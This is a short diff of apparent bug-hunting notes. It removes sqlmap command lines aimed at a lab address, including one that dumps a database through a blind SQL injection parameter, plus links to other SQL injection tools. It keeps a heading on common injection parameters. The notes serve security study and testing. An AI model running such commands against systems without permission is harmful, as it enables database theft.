@@ -1,19 +1,4 @@
-🗲SqlMap
-  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user  -> Testing on parameter names "user", we'll get confirmation
-  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump  -> Dumping database
-  #sqlmap.py -r /home/request.txt --dbs -> Login page username sqli detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-36e091e8a070)
-  #sqlmap.py -r /home/request.txt --dbs --level 5 -> parameter sql detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-part-2-53e9775b67f5)
 
-
-
-🗲Ghauri (https://github.com/r0oth3x49/ghauri)
-
-🗲SqlFinder (https://github.com/americo/sqlifinder/tree/main)
-
-🗲Blisqy (https://github.com/JohnTroony/Blisqy)
-
-
-#(Knowing what database we are dealing with makes it easier to understand how to construct our malicious queries)
 
 Top 25 SQL Injection Parameters for @trbughunters
 
